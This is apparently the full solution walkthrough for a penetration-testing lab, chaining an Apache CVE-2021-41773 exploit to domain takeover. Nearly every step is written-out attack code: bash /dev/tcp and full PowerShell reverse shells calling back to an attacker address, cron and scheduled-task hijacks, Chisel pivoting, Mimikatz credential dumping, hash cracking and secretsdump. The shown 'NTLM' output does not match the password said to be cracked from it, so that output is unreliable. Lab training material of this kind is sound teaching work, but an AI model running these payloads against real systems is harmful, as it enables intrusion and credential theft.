# Attack Walkthrough – Full Solution

This document provides a step‑by‑step solution for the lab. Use it to verify your own approach or to understand the intended attack path.

## Prerequisites
- Attacker machine (Kali Linux) at `192.168.1.100`.
- All three lab VMs running (`vagrant up`).
- Tools downloaded (`tools/download‑tools.sh`).

## Stage 1: Initial Access (CVE‑2021‑41773)

### 1.1 Reconnaissance
```bash
nmap -sV 192.168.1.10
```
Output shows Apache 2.4.49 on port 80.

### 1.2 Exploitation
CVE‑2021‑41773 allows path traversal to CGI scripts. The server has a CGI endpoint `/cgi‑bin/`.

Start a netcat listener on the attacker:
```bash
nc -nlvp 4444
```

Execute the exploit:
```bash
curl "http://192.168.1.10/cgi‑bin/../../../..//bin/sh" -d "echo; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
```

You should receive a reverse shell as `www‑data`.

**Flag:** Not yet.

## Stage 2: Privilege Escalation on WEB01

### 2.1 Enumeration
Check cron jobs:
```bash
cat /etc/crontab
```
Output includes:
```
* * * * * root /usr/local/bin/backup.sh
```

Check permissions of `backup.sh`:
```bash
ls -la /usr/local/bin/backup.sh
```
It’s world‑writable (`-rw‑rw‑rw‑`).

### 2.2 Exploitation
Replace `backup.sh` with a reverse‑shell payload:
```bash
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'bash -i >& /dev/tcp/192.168.1.100/4445 0>&1' >> /usr/local/bin/backup.sh
```

Start another listener on attacker:
```bash
nc -nlvp 4445
```

Wait up to one minute for the cron job to execute. You’ll receive a root shell.

### 2.3 Credential Discovery
```bash
cat /root/creds.txt
```
Output: `corp\web_admin:P@ssw0rd`

### 2.4 Flag
```bash
cat /root/flag_root.txt
```
**Flag:** `FLAG{WEB01_ROOT_ESCA1ATED}`

## Stage 3: Pivoting to Internal Network

### 3.1 Network Enumeration
Check WEB01’s interfaces:
```bash
ip addr
```
`eth1` has IP `10.0.20.10`. The internal subnet is `10.0.20.0/24`.

### 3.2 Set Up Chisel SOCKS Proxy
On attacker, start Chisel server:
```bash
cd /path/to/tools
./chisel_linux_amd64 server -p 8000 --reverse &
```

On WEB01, upload Chisel (via Python HTTP server) or use the synced `/vagrant/tools` folder:
```bash
cd /vagrant/tools
./chisel_linux_amd64 client 192.168.1.100:8000 R:socks &
```

### 3.3 Scan Internal Network
Configure `proxychains` (`/etc/proxychains.conf`):
```
socks5 127.0.0.1 1080
```

Scan internal hosts:
```bash
proxychains nmap -sT -Pn 10.0.20.0/24
```
Discovered:
- `10.0.20.5` (DC) – ports 445, 5985 open.
- `10.0.20.20` (WORKSTATION) – port 445 open.

## Stage 4: Lateral Movement to WORKSTATION

### 4.1 Authenticate with Found Credentials
Use `web_admin:P@ssw0rd` to access the workstation.

List shares:
```bash
proxychains smbclient -L 10.0.20.20 -U 'corp\web_admin%P@ssw0rd'
```

Mount the writable share:
```bash
proxychains mount -t cifs //10.0.20.20/C$ /mnt -o username=corp\web_admin,password=P@ssw0rd,domain=corp
```

Navigate to the scheduled‑task folder:
```bash
cd /mnt/ProgramData/Tasks
```

### 4.2 Hijack Scheduled Task
Replace `backup.bat` with a PowerShell reverse shell.

Create a PowerShell reverse‑shell script (on attacker):
```bash
cat > reverse.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4455)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
EOF
```

Copy it to the share (simplified: just embed a one‑liner). For simplicity, replace `backup.bat` with:
```batch
@echo off
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Start a listener on attacker:
```bash
nc -nlvp 4455
```

Wait up to one minute for the scheduled task to run. You’ll receive a SYSTEM shell.

### 4.3 Flag
```powershell
type C:\Windows\System32\flag_system.txt
```
**Flag:** `FLAG{WORKSTATION_SYSTEM_ACCESS}`

## Stage 5: Credential Harvesting

### 5.1 Run Mimikatz
Upload Mimikatz to the workstation (use the synced `C:\vagrant\tools\` folder). In the SYSTEM shell:
```cmd
cd C:\vagrant\tools
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Look for the `backup_admin` entry:
```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : backup_admin
Domain            : CORP
Logon Server      : DC
Logon Time        : 3/10/2026 12:00:00 PM
SID               : S-1-5-21-...
	msv :
	 [00000003] Primary
	 * Username : backup_admin
	 * Domain   : CORP
	 * NTLM     : aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
	 * SHA1     : ...
```

Copy the NTLM hash: `aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99`

### 5.2 Crack the Hash
On attacker, create a hash file:
```bash
echo "backup_admin:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

Crack with John the Ripper:
```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Output:
```
Winter2024!       (backup_admin)
```

Password: `Winter2024!`

## Stage 6: Domain Compromise

### 6.1 Authenticate to DC
Use `evil‑winrm` through the Chisel proxy:
```bash
proxychains evil‑winrm -i 10.0.20.5 -u backup_admin -p 'Winter2024!'
```

You now have a Domain Admin shell on the DC.

### 6.2 Final Flag
```powershell
type C:\Users\Administrator\Desktop\flag_domain.txt
```
**Flag:** `FLAG{DOMAIN_COMPROMISED_FULL_CONTROL}`

## Post‑Exploitation (Optional)
- Dump all domain hashes: `secretsdump.py corp.local/backup_admin:Winter2024!@10.0.20.5`
- Create a persistent backdoor (Golden Ticket, etc.).

## Summary
The attack chain demonstrates:
1. **Vulnerability exploitation** (CVE‑2021‑41773).
2. **Privilege escalation** via misconfigured cron.
3. **Credential discovery** and pivoting.
4. **Lateral movement** through writable scheduled tasks.
5. **Credential dumping** and cracking.
6. **Domain takeover** with compromised Domain Admin credentials.

All flags collected:
- `FLAG{WEB01_ROOT_ESCA1ATED}`
- `FLAG{WORKSTATION_SYSTEM_ACCESS}`
- `FLAG{DOMAIN_COMPROMISED_FULL_CONTROL}`